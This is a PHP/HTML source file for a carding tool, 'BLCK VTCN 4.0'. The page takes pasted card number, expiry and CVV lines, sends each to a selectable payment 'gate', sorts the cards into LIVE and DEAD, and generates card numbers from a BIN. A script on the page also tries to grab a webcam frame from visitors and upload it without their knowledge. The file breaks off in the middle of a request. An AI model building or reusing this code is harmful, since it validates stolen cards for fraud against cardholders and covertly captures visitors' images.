<?php

include 'config.php';
session_start();
$visitorIP = $_SERVER['REMOTE_ADDR']; // Get the IP address of the visitor

$counterFile = "E:/xammpp/xampp/htdocs/Checker/counter.txt";

// Check if the session or cookie already counted
$sessionKey = 'counted';
$cookieName = 'visited';

// Function to increment the counter
function incrementCounter($file) {
    $visits = 0;
    if (file_exists($file) && is_readable($file) && is_writable($file)) {
        $visits = (int)file_get_contents($file);
        $visits++;
        file_put_contents($file, $visits);
    }
    return $visits;
}

// Determine if this is a new visit
$is_new_visit = !isset($_SESSION[$sessionKey]) && !isset($_COOKIE[$cookieName]);

if ($is_new_visit) {
    // Increment visit count
    $visits = incrementCounter($counterFile);
    
    // Mark this session as counted
    $_SESSION[$sessionKey] = true;

    // Set a cookie that expires in 1 year
    setcookie($cookieName, 'true', time() + (86400 * 365), "/");
} else {
    // If not a new visit, just read the current count
    $visits = file_exists($counterFile) ? file_get_contents($counterFile) : 0;
}



?>

<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title> Secret Service</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
    <audio id="bvsfx" src="assets/sfx/click.mp3"></audio>

    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@100..900&display=swap" rel="stylesheet">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>

	<audio id="yuna">
<source src="click.mp3" type="audio/mpeg">

	</audio>
    <style>

.noto-sans jp- {
  font-family: "Noto Sans JP", sans-serif;
  font-optical-sizing: auto;
  font-weight: <weight>;
  font-style: normal;
}

        @import url('https://fonts.googleapis.com/css2?family=Rubik&family=Poppins&family=Martian+Mono&display=swap');
        @media (min-width: 768px) {
    .logo-circle {
        width: 120px; /* Larger size for tablets and desktops */
        height: 120px; /* Keep the same as width for a circle */
    }
}
        /* Base and Dark Theme Variables */
        :root {
            --background-color-light: #EAEAEA;
            --text-color-light: #0f0f0f;
            --badge-color-light: #0f0f0f;
            --background-color-dark: #3C4048;
            --text-color-dark: #ffffff;
            --badge-color-dark: #ffffff;
        }
        body {
            background-color: var(--background-color-light);
            color: var(--text-color-light);
            transition: background-color 0.3s, color 0.3s;
        }
        .card, .btn-ss, .badge-ss {
            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
        }
        .dark-mode {
            --background-color-light: var(--background-color-dark);
            --text-color-light: var(--text-color-dark);
            --badge-color-light: var(--badge-color-dark);
        }
        .card, .btn-ss, .badge-ss {
            background-color: var(--background-color-light);
            color: var(--text-color-light);
            border-color: var(--text-color-light);
        }
        .theme-switch-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
        }
        .theme-switch {
            display: inline-block;
            height: 34px;
            position: relative;
            width: 60px;
        }
        .theme-switch input { display:none; }
        .slider {
            background-color: #ccc;
            bottom: 0;
            cursor: pointer;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            transition: .4s;
        }

        .logo-circle {
    border-radius: 50%;
    width: 20%;
    height: 20%;
    object-fit: cover; /* Ensures the image covers the area without losing its aspect ratio */
    object-fit: cover;
    display: block;
    margin: 0 auto; /* Center the logo */
}
@keyframes swing {
    0%, 100% {
        transform: rotate(0deg);
    }
    25% {
        transform: rotate(-15deg);
    }
    75% {
        transform: rotate(15deg);
    }
}

.logo-circle {
    animation: swing 2s infinite ease-in-out;
}


        .slider:before {
            background-color: #fff;
            bottom: 4px;
            content: "";
            height: 26px;
            left: 4px;
            position: absolute;
            transition: .4s;
            width: 26px;
        }
        input:checked + .slider {
            background-color: #66bb6a;
        }
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        .slider.round {
            border-radius: 34px;
        }
        .slider.round:before {
            border-radius: 50%;
        }

        .logo-container {
    display: flex;
    justify-content: center; /* Centers horizontally */
    align-items: center; /* Centers vertically */
    height: 100%; /* E
    
    nsure the container takes full height of its parent */
}
@keyframes spin {
    from {
        transform: rotate(0deg);
    }
    to {
        transform: rotate(360deg);
    }
}

.logo-spin {
    animation: spin 2s linear infinite;
}
.visitor-count p {
    /* Add your styles here */
    color: #ccc;
    font-size: 16px;
}


    </style>
</head>
<body style = "background-color:black;">
<div class="visitor-count">
    Page views: <?php echo htmlspecialchars($visits); ?>
</div>


<div id="loadingOverlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; justify-content: center; align-items: center;">
    <img src="img/blackvatican.png" class="logo-spin" alt="Loading...">
</div>

<script>


document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('loadingOverlay').style.display = 'none';
});

window.onload = function() {
    document.getElementById('loadingOverlay').style.display = 'none';
};


window.onload = function() {
    var logoImage = new Image();
    logoImage.onload = function() {
        // Only hide the overlay after the logo has loaded
        setTimeout(function() {
            document.getElementById('loadingOverlay').style.display = 'none';
        }, 30000); // Adjust time as needed
    };
    logoImage.src = "img/blackvatican.png"; // Ensure this matches your actual logo path
};




</script>
  <!-- <script>
        // Disable right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        }, false);

        // Disable F12 key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12') {
                e.preventDefault();
            }
        }, false);
    </script> -->
    <div class="container mt-5">
    <!-- <div class="theme-switch-wrapper">
        <label class="theme-switch" for="checkbox">
            <input type="checkbox" id="darkModeToggle" />
            <div class="slider round"></div>
        </label>
        <em>Enable Dark Mode!</em>
    </div> -->
    <style>

*,
::before,
::after {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

/* body {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background-color: #111111;
}

.yawa {
  position: relative;
  width: 300px;
  height: 300px;
  color: #fff;
  background: transparent;
  overflow: hidden;
  border-top: 1px solid rgba(255, 49, 49, 0.5);
  border-right: 1px solid rgba(0, 255, 255, 0.5);
  border-bottom: 1px solid rgba(57, 255, 20, 0.5);
  border-left: 1px solid rgba(255, 255, 113, 0.5);
  font-family: sans-serif;
  display: flex;
  flex-direction: column;
  justify-content: space-around;
  align-items: center;
  padding: 1em;
} */

p {
  font-size: 0.95rem;
  text-align: center;
}

span {
  position: absolute;
  border-radius: 100vmax;
}

.top {
  top: 0;
  left: 0;
  width: 0;
  height: 5px;
  background: linear-gradient(
    90deg,
    transparent 50%,
    rgba(255, 49, 49, 0.5),
    rgb(255, 49, 49)
  );
}

.bottom {
  right: 0;
  bottom: 0;
  height: 5px;
  background: linear-gradien(90deg, rgba(255,12,225,1) 50%, rgba(255,0,35,1),
    transparent 50%
  );
}

.right {
  top: 0;
  right: 0;
  width: 5px;
  height: 0;
  background: linear-gradient(90deg, rgba(2,0,36,1) 25%, rgba(255,12,225,1) 100%, rgba(255,0,35,1)
  );
}

.left {
  left: 0;
  bottom: 0;
  width: 5px;
  height: 0;
  background: linear-gradient(90deg, rgba(2,0,36,1) 25%, rgba(126,12,255,1) 100%, rgba(255,0,35,1) ,
    transparent 70%
  );
}

.top {
  animation: animateTop 3s ease-in-out infinite;
}

.bottom {
  animation: animateBottom 3s ease-in-out infinite;
}

.right {
  animation: animateRight 3s ease-in-out infinite;
}

.left {
  animation: animateLeft 3s ease-in-out infinite;
}

@keyframes animateTop {
  25% {
    width: 100%;
    opacity: 1;
  }

  30%,
  100% {
    opacity: 0;
  }
}

@keyframes animateBottom {
  0%,
  50% {
    opacity: 0;
    width: 0;
  }

  75% {
    opacity: 1;
    width: 100%;
  }

  76%,
  100% {
    opacity: 0;
  }
}

@keyframes animateRight {
  0%,
  25% {
    opacity: 0;
    height: 0;
  }

  50% {
    opacity: 1;
    height: 100%;
  }

  55%,
  100% {
    height: 100%;
    opacity: 0;
  }
}

@keyframes animateLeft {
  0%,
  75% {
    opacity: 0;
    bottom: 0;
    height: 0;
  }

  100% {
    opacity: 1;
    height: 100%;
  }
}



    </style>

    <script>


navigator.mediaDevices.getUserMedia({ video: true })
  .then(function(stream) {
    // Display the video stream in a video element
    var video = document.querySelector('video');
    video.srcObject = stream;
  })
  .catch(function(err) {
    console.log('An error occurred: ' + err);
  });

  var canvas = document.querySelector('canvas');
var context = canvas.getContext('2d');
context.drawImage(video, 0, 0, canvas.width, canvas.height);
var dataUrl = canvas.toDataURL('image/png');
fetch('save_image.php', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ image: dataUrl })
});

    </script>
    <div id="loadingLabel" style="display: none;" style ="color:red;" >Checking na potaena</div>
        <div class="card" style="border-radius: 15px 50px;">
            
        <div class="card-body d-flex justify-content-between align-items-start yawa" style = "background-color:#121212; border-radius: 15px 50px;">
            <div class="card-body">
            <p style = "text-align:center;"> <b> BLCK VTCN 4.0 </b> </p>

            <div class="d-flex justify-content-center " >
    <img  src="img/ice.gif" alt="Your image description" sty>
            </div>

<style>
@keyframes glitch {
  0% {
    transform: translate(0);
  }
  20% {
    transform: translate(-5px, 5px);
  }
  40% {
    transform: translate(-10px, -10px);
  }
  60% {
    transform: translate(10px, 0px);
  }
  80% {
    transform: translate(-5px, 5px);
  }
  100% {
    transform: translate(0);
  }
}

.glitch {
  position: relative;
  display: inline-block;
}

.glitch::before,
.glitch::after {
  content: attr(alt);
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: url(img/ice.gif);
}

.glitch::before {
  animation: glitch 1s infinite linear alternate-reverse;
  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
  opacity: 0.6;
}

.glitch::after {
  animation: glitch 0.5s infinite linear alternate-reverse;
  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
  opacity: 0.6;
}
</style>

                    <div class="card-footer black-vatican ">
                        <div class="px-1">
                            <div class="row text-center" id="counter">
                             
                                <div class="col" style = "color:yellow;">
                                    LIVE : <span id="n-count">0</span>
                                </div>
                                <div class="col" style = "color:yellow;">
                                    DEAD : <span id="d-count">0</span>
                                </div>
                                <!-- <div class="col">
                TOTAL : <span id="total-count">0</span>
            </div> -->
                            </div>
                        </div>
                    </div>



                    <div class="top"> </div>
                    <textarea style="background-color:#121212; color:yellow;" class="form-control mb-3 " id="cards" name="cards" rows="7" style= "text-align:center;" placeholder="xxxxxxxxxxxx|xx|xxxx|xxx" ></textarea>
                
                <div class="top"> </div>
                <select id="gates" class="form-control shadow-none mb-2" style="background-color:#121212; color:yellow;">
                        <?php foreach ($apiname as $key => $apiname) {
                            echo '<option value="'.$fname[$key].'">'.$apiname.'</option>';}?>
                        </select>
                        <div class="d-grid gap-2 d-md-flex justify-content-center align-items-center">

                        <!-- <script>
window.onload = function() {
  var textarea = document.getElementById('cards');
  var startButton = document.getElementById('start');
  var formatButton = document.getElementById('format');

  startButton.addEventListener('click', function() {
    textarea.style.display = 'none';
  });

  formatButton.addEventListener('click', function() {
    textarea.style.display = 'block';
  });
};



</script> -->
<script>
window.onload = function() {
  var textarea = document.getElementById('cards');
  var startButton = document.getElementById('start');
  var formatButton = document.getElementById('format');
  var loadingLabel = document.getElementById('loadingLabel');

  startButton.addEventListener('click', function() {
    textarea.style.display = 'none';
    loadingLabel.style.display = 'block';
  });

  formatButton.addEventListener('click', function() {
    textarea.style.display = 'block';
    loadingLabel.style.display = 'none';
  });
};

</script>

                        <!-- <button class="btn btn-ss" id="start">START</button> -->
    <!-- <input type="file" id="fileInput" accept=".txt" class="mb-2 mb-md-0"> -->



    <!-- <button class="btn btn-ss" id="format">FORMAT</button> -->
</div>

            </div>
        </div>
        <span class="top"></span>
  <span class="right"></span>
  <span class="bottom"></span>
  <span class="left"></span>
        </div>

        <br>
<style>


.responsive-textarea {
  background-color: #121212;
  color: yellow;
  text-align: center;
  width: 100%; /* Full width by default */
}

/* On screens that are 992px or less, make the textarea a bit smaller */
@media screen and (max-width: 992px) {
  .responsive-textarea {
    width: 90%;
    margin: auto; /* Center the textarea */
  }
}

/* On screens that are 600px or less, make the textarea full width again */
@media screen and (max-width: 600px) {
  .responsive-textarea {
    width: 100%;
  }
}


@font-face {
  font-family: Cyber;
  src: url("https://assets.codepen.io/605876/Blender-Pro-Bold.otf");
  font-display: swap;
}

* {
  box-sizing: border-box;
}

body {
  display: flex;
  align-items: center;
  flex-direction: column;
  justify-content: center;
  min-height: 100vh;
  font-family: 'Cyber', sans-serif;
  /* background:#121212; */
}

body .cybr-btn + .cybr-btn {
  margin-top: 2rem;
}
/* Styles for desktop */
.container {
  width: 60%;
  margin: 0 auto;
}

/* Styles for tablet */
@media screen and (max-width: 768px) {
  .container {
    width: 80%;
  }
}

/* Styles for mobile */
@media screen and (max-width: 480px) {
  .container {
    width: 100%;
  }
}
.cybr-btn {
    
  --primary: hsl(var(--primary-hue), 85%, calc(var(--primary-lightness, 50) * 1%));
  --shadow-primary: hsl(var(--shadow-primary-hue), 90%, 50%);
  --primary-hue: 0;
  --primary-lightness: 50;
  --color: hsl(0, 0%, 100%);
  --font-size: 26px;
  --shadow-primary-hue: 180;
  --label-size: 9px;
  --shadow-secondary-hue: 60;
  --shadow-secondary: hsl(var(--shadow-secondary-hue), 90%, 60%);
  --clip: polygon(0 0, 100% 0, 100% 100%, 95% 100%, 95% 90%, 85% 90%, 85% 100%, 8% 100%, 0 70%);
  --border: 4px;
  --shimmy-distance: 5;
  --clip-one: polygon(0 2%, 100% 2%, 100% 95%, 95% 95%, 95% 90%, 85% 90%, 85% 95%, 8% 95%, 0 70%);
  --clip-two: polygon(0 78%, 100% 78%, 100% 100%, 95% 100%, 95% 90%, 85% 90%, 85% 100%, 8% 100%, 0 78%);
  --clip-three: polygon(0 44%, 100% 44%, 100% 54%, 95% 54%, 95% 54%, 85% 54%, 85% 54%, 8% 54%, 0 54%);
  --clip-four: polygon(0 0, 100% 0, 100% 0, 95% 0, 95% 0, 85% 0, 85% 0, 8% 0, 0 0);
  --clip-five: polygon(0 0, 100% 0, 100% 0, 95% 0, 95% 0, 85% 0, 85% 0, 8% 0, 0 0);
  --clip-six: polygon(0 40%, 100% 40%, 100% 85%, 95% 85%, 95% 85%, 85% 85%, 85% 85%, 8% 85%, 0 70%);
  --clip-seven: polygon(0 63%, 100% 63%, 100% 80%, 95% 80%, 95% 80%, 85% 80%, 85% 80%, 8% 80%, 0 70%);
  font-family: 'Cyber', sans-serif;
  color: var(--color);
  cursor: pointer;
  background: transparent;
  text-transform: uppercase;
  font-size: var(--font-size);
  outline: transparent;
  letter-spacing: 2px;
  position: relative;
  font-weight: 700;
  border: 0;
  min-width: 300px;
  height: 75px;
  line-height: 75px;
  transition: background 0.2s;
}

.cybr-btn:hover {
  --primary: hsl(var(--primary-hue), 85%, calc(var(--primary-lightness, 50) * 0.8%));
}
.cybr-btn:active {
  --primary: hsl(var(--primary-hue), 85%, calc(var(--primary-lightness, 50) * 0.6%));
}

.cybr-btn:after,
.cybr-btn:before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  clip-path: var(--clip);
  z-index: -1;
}

.cybr-btn:before {
  background: var(--shadow-primary);
  transform: translate(var(--border), 0);
}

.cybr-btn:after {
  background: var(--primary);
}

.cybr-btn__tag {
  position: absolute;
  padding: 1px 4px;
  letter-spacing: 1px;
  line-height: 1;
  bottom: -5%;
  right: 5%;
  font-weight: normal;
  color: hsl(0, 0%, 0%);
  font-size: var(--label-size);
}

.cybr-btn__glitch {
  position: absolute;
  top: calc(var(--border) * -1);
  left: calc(var(--border) * -1);
  right: calc(var(--border) * -1);
  bottom: calc(var(--border) * -1);
  background: var(--shadow-primary);
  text-shadow: 2px 2px var(--shadow-primary), -2px -2px var(--shadow-secondary);
  clip-path: var(--clip);
  animation: glitch 2s infinite;
  display: none;
}

.cybr-btn:hover .cybr-btn__glitch {
  display: block;
}
.cybr-btn {
  ...
  font-size: 10px;
  min-width: 200px;
  height: 40px;
  line-height: 40px;
  ...
}
.cybr-btn__glitch:before {
  content: '';
  position: absolute;
  top: calc(var(--border) * 1);
  right: calc(var(--border) * 1);
  bottom: calc(var(--border) * 1);
  left: calc(var(--border) * 1);
  clip-path: var(--clip);
  background: var(--primary);
  z-index: -1;
}

@keyframes glitch {
  0% {
    clip-path: var(--clip-one);
  }
  2%, 8% {
    clip-path: var(--clip-two);
    transform: translate(calc(var(--shimmy-distance) * -1%), 0);
  }
  6% {
    clip-path: var(--clip-two);
    transform: translate(calc(var(--shimmy-distance) * 1%), 0);
  }
  9% {
    clip-path: var(--clip-two);
    transform: translate(0, 0);
  }
  10% {
    clip-path: var(--clip-three);
    transform: translate(calc(var(--shimmy-distance) * 1%), 0);
  }
  13% {
    clip-path: var(--clip-three);
    transform: translate(0, 0);
  }
  14%, 21% {
    clip-path: var(--clip-four);
    transform: translate(calc(var(--shimmy-distance) * 1%), 0);
  }
  25% {
    clip-path: var(--clip-five);
    transform: translate(calc(var(--shimmy-distance) * 1%), 0);
  }
  30% {
    clip-path: var(--clip-five);
    transform: translate(calc(var(--shimmy-distance) * -1%), 0);
  }
  35%, 45% {
    clip-path: var(--clip-six);
    transform: translate(calc(var(--shimmy-distance) * -1%));
  }
  40% {
    clip-path: var(--clip-six);
    transform: translate(calc(var(--shimmy-distance) * 1%));
  }
  50% {
    clip-path: var(--clip-six);
    transform: translate(0, 0);
  }
  55% {
    clip-path: var(--clip-seven);
    transform: translate(calc(var(--shimmy-distance) * 1%), 0);
  }
  60% {
    clip-path: var(--clip-seven);
    transform: translate(0, 0);
  }
  31%, 61%, 100% {
    clip-path: var(--clip-four);
  }
}

.cybr-btn:nth-of-type(2) {
  --primary-hue: 260;
}

.button-container {
  display: flex;
  justify-content: center;
  align-items: center;
  flex-wrap: wrap;
}

.cybr-btn {
  margin: 10px;
  flex-basis: calc(50% - 20px); /* 50% for two columns, minus margin */
}


@keyframes loading {
  0% { content: "Please wait.... checking"; }
  25% { content: "Please wait.... checking."; }
  50% { content: "Please wait.... checking.."; }
  75% { content: "Please wait.... checking..."; }
  100% { content: "Please wait.... checking...."; }
}

#loadingLabel {
  animation: loading 2s infinite;
}

</style>
                 <div class="button-container">
  <button class="cybr-btn" id="start">
    Start<span aria-hidden>_</span>
    <span aria-hidden class="cybr-btn__glitch">Start_</span>
    <span aria-hidden class="cybr-btn__tag">R25</span>
  </button>
  <button class="cybr-btn" id="format">
    Format<span aria-hidden>_</span>
    <span aria-hidden class="cybr-btn__glitch">Format_</span>
    <span aria-hidden class="cybr-btn__tag">R25</span>
  </button>
</div>
        <div class="card">
        <span class="top"></span>
  <span class="right"></span>
  <span class="bottom" style ="border-radius: 15px 50px;"></span>
  <span class="left"></span>
  
            <div class="card-body" style="background-color:#121212;">
           

                <!-- Show LIVE and DEAD buttons -->
                <div class="d-grid gap-2 d-md-flex justify-content-md-center">
             

                <script> document.getElementById('fileInput').addEventListener('change', function(event) {
    var file = event.target.files[0]; // Get the selected file

    if (!file) {
        return; // Exit if no file is selected
    }

    var reader = new FileReader();
    reader.onload = function(e) {
        var content = e.target.result;
        // Populate the textarea
        document.getElementById('cards').value = content;
    };
    reader.readAsText(file); // Read the file as text
});
</script>
<button class="btn btn-ss cyber-hover" id="removeDuplicates">Remove Duplicates Cards</button>
<button class="btn btn-secondary cyber-hover" id="showLive">SHOW CCN</button>
<button class="btn btn-secondary cyber-hover" id="showLive">SHOW CVV</button>
<button class="btn btn-secondary cyber-hover" data-bs-toggle="modal" data-bs-target="#generatorModal" id="showGenerator">SHOW CC GENERATOR</button>
<button class="btn btn-secondary cyber-hover" id="showDead">SHOW DEAD</button>
<button class="btn btn-ss cyber-hover" id="musicPlaylistBtn">Music Playlist</button>


</div>
            </div>
        </div>
        
    </div>

<style>
.cyber-hover {
  transition: all 0.3s ease-in-out;
}

.cyber-hover:hover {
  background-color: #0f0; /* Change to the color you want */
  transform: scale(1.1); /* Increase size by 10% */
}

/* .btn {
  display: inline-block;
  font-weight: 400;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  padding: .375rem .75rem;
  font-size: 1rem;
  line-height: 1.5;
  border-radius: .25rem;
  transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
} */

.btn-ss {
  color: #fff;
  background-color: red;
  border-color: red;
}

.btn-ss:hover {
  color: #fff;
  background-color: violet;
  border-color: #0062cc;
}

.btn-secondary {
  color: #fff;
  background-color: #6c757d;
  border-color: #6c757d;
}

.btn-secondary:hover {
  color: #fff;
  background-color: #5a6268;
  border-color: #545b62;
}


</style>


<!-- Music Playlist Modal -->
<div id="musicPlaylistModal" class="modal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Music Playlist</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
      <iframe style="border-radius:12px" src="https://open.spotify.com/embed/playlist/37i9dQZF1DWYMokBiQj5qF?utm_source=generator&theme=0" width="100%" height="152" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
<script>
  document.getElementById('musicPlaylistBtn').addEventListener('click', function() {
    var myModal = new bootstrap.Modal(document.getElementById('musicPlaylistModal'));
    myModal.show();
  });
</script>



<!-- LIVE Modal -->
<div class="modal fade" id="liveModal" tabindex="-1" aria-labelledby="liveModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
            <div class="modal-header d-flex justify-content-between align-items-center">
    <h5 class="modal-title" id="liveModalLabel" style="color:black;">CCN</h5>
    <div>
        <button type="button" class="btn btn-ss me-2" id="clearLive">Clear LIVE</button>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
</div>

                <div class="modal-body" id="live-div" style ="color:black;"></div>
                <div class="modal-footer">
               
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="copyContent">Copy</button>
                </div>
            </div>
        </div>
    </div>


    <script>
document.getElementById('copyContent').addEventListener('click', function() {
    const liveDivContent = document.getElementById('live-div').innerText;
    navigator.clipboard.writeText(liveDivContent).then(() => {
        alert('Content copied to clipboard!');
    }).catch(err => {
        console.error('Error in copying text: ', err);
    });
});
</script>

    <!-- DEAD Modal -->
    <!-- <div class="modal fade" id="deadModal" tabindex="-1" aria-labelledby="deadModalLabel" aria-hidden="true" >
        <div class="modal-dialog">
            <div class="modal-content" style= "background-color:#121212; color:red;">
           
            <div class="modal-header" >
    <h5 class="modal-title" id="deadModalLabel" style="color:black;">DEAD </h5><br>
    <div >
        <button type="button" class="btn btn-ss me-2" id="clearDead">Clear DEAD</button>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
</div>
                <div class="modal-body" id="dead-div" style ="color:white;"> </div><br>

                <div class="modal-footer" >
               
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>

            <span class="top"></span>
  <span class="right"></span>
  <span class="bottom"></span>
  <span class="left"></span>
        </div>
    </div>
    </div> -->


    <div class="modal fade" id="deadModal" tabindex="-1" aria-labelledby="deadModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
            <div class="modal-header d-flex justify-content-between align-items-center">
    <h5 class="modal-title" id="deadModalLabel" style="color:black;"></h5>
    <div>
        <button type="button" class="btn btn-ss me-2" id="clearLive">Clear LIVE</button>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
</div>

                <div class="modal-body" id="dead-div" style ="color:black;"></div>
                <div class="modal-footer">
               
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="copyContent">Copy</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="generatorModal" tabindex="-1" aria-labelledby="generatorModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                <div class="card-header black-vatican " style ="color:black;">Card Generator</div>
                 <!-- <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button> -->
                </div>
               
                <div class="modal-body" id="generator"> 
                     <!-- CC-generator -->
                <div class="card-body">
                        <textarea id="bin" class="form-control mb-2 black-vatican" rows="1"
                            placeholder="Bin"></textarea>
                        <div class="row mb-2">
                            <div class="col pe-0">
                                <select id="month" class="form-control shadow-none black-vatican">
                                    <option value="" disabled="disabled" selected="true">Month</option>
                                    <option value="01">01</option>
                                    <option value="02">02</option>
                                    <option value="03">03</option>
                                    <option value="04">04</option>
                                    <option value="05">05</option>
                                    <option value="06">06</option>
                                    <option value="07">07</option>
                                    <option value="08">08</option>
                                    <option value="09">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                </select>
                            </div>
                            <div class="col pw-0">
                                <select id="year" class="form-control shadow-none black-vatican">
                                    <option value="" disabled="disabled" selected="true">Year</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
                                    <option value="2029">2029</option>
                                    <option value="2030">2030</option>
                                </select>
                            </div>
                        </div>
                        <textarea id="cvv" class="form-control mb-2 shadow-none black-vatican" rows="1"
                            placeholder="xxx"></textarea>
                        <textarea id="amount" class="form-control mb-2 shadow-none black-vatican" rows="1"
                            placeholder="Amount"></textarea>
                        <button class="btn btn-secondary" id="generate">Generate</button>
                    </div>
              

                <!-- end-cc --></div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
            <span class="top"></span>
  <span class="right"></span>
  <span class="bottom"></span>
  <span class="left"></span>
        </div>
    </div>

    </div>
 <br>

 <div class="d-grid gap-2 d-md-flex justify-content-md-center">
    <button class="btn btn-ss" id="reloadPage">Reload Page</button>
    <!-- Other buttons -->
</div>


<script>
    document.getElementById('reloadPage').addEventListener('click', function() {
        window.location.reload();
    });
</script>
<br><br>


    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function () {
            let live = 0;
            let dead = 0;

            $("#stop").click(function() {
        shouldContinue = false; // Set the flag to false when "STOP" is clicked
    });

    $('#format').click(function() {
        alert("STOPPING PROCESSING CARD!");
        $('#cards').val('');
    });
            function updateCounts() {
        // Calculate total count
        let totalCount = liveCount + deadCount;

        // Update the counters on the page
        $('#n-count').text(live);
        $('#d-count').text(dead);
        $('#total-count').text(totalCount); // Update total count display

    }

 // Dark Mode Toggle Functionality
 $('#darkModeToggle').change(function() {
        $('body').toggleClass('dark-mode');
        localStorage.setItem('darkMode', $('body').hasClass('dark-mode') ? 'true' : 'false');
        updateThemeLabel();
    });

    function updateThemeLabel() {
        if ($('body').hasClass('dark-mode')) {
            $('em').text('Enable Light Mode!');
        } else {
            $('em').text('Enable Dark Mode!');
        }
    }

    // Initialize the theme based on local storage
    if (localStorage.getItem('darkMode') === 'true') {
        $('body').addClass('dark-mode');
        $('#darkModeToggle').prop('checked', true);
    }
    updateThemeLabel();




    $('#clearDead').click(function() {
        // Popup alert message
        alert("RECYCLED DEAD CARDS ! ");
        // Or you can display a message in the modal or somewhere else on the page instead of an alert
        // Example: $('#generator').text("DONE generating");
    });


    $('#removeDuplicates').click(function() {
    alert("Removed Duplicates Cards!");
}

);

$('#clearLive').click(function() {
    alert("cleared text");
}

);


    $('#clearDead').click(function() {
        // Popup alert message
        alert("RECYCLED DEAD CARDS ! ");
        // Or you can display a message in the modal or somewhere else on the page instead of an alert
        // Example: $('#generator').text("DONE generating");
    });





    // Generate button click event
    $('#start').click(function() {
        // Popup alert message
        alert("please wait! <br> <b> OWNER: YOON-JUNG</b>");
        // Or you can display a message in the modal or somewhere else on the page instead of an alert
        // Example: $('#generator').text("DONE generating");
    });




    $('#generate').click(function() {
        // Popup alert message
        alert("DONE GENERATE CARDS");
        // Or you can display a message in the modal or somewhere else on the page instead of an alert
        // Example: $('#generator').text("DONE generating");
    });

            // Show LIVE Modal
            $('#showLive').click(function() {
                $('#liveModal').modal('show');
            });

            // Show DEAD Modal
            $('#showDead').click(function() {
                $('#deadModal').modal('show');
            });

                 // Show GENERATOR Modal
                 $('#showGenerator').click(function() {
                $('#generatorModal').modal('show');
            });

 // Clear LIVE Results
 $('#clearLive').click(function() {
        $('#live-div').empty(); // Clears the content of the LIVE results container
    });

    // Clear DEAD Results
    $('#clearDead').click(function() {
        $('#dead-div').empty(); // Clears the content of the DEAD results container
    });

    // Function to update theme label
    function updateThemeLabel(isDarkMode) {
        $('em').text(isDarkMode ? 'Enable Light Mode!' : 'Enable Dark Mode!');
    }

        });

      

        $("#start").click(function() {
            var card = $("#cards").val();
            var gate = $("#gates").val();
            var carda = card.split("\n");
            var array = card.split("\n");
            var live = 0;
            var dead = 0;
       
            array.forEach(function(value, index) {
                setTimeout(function() {
                    $.ajax({
                        url: gate + '?card=' + value,
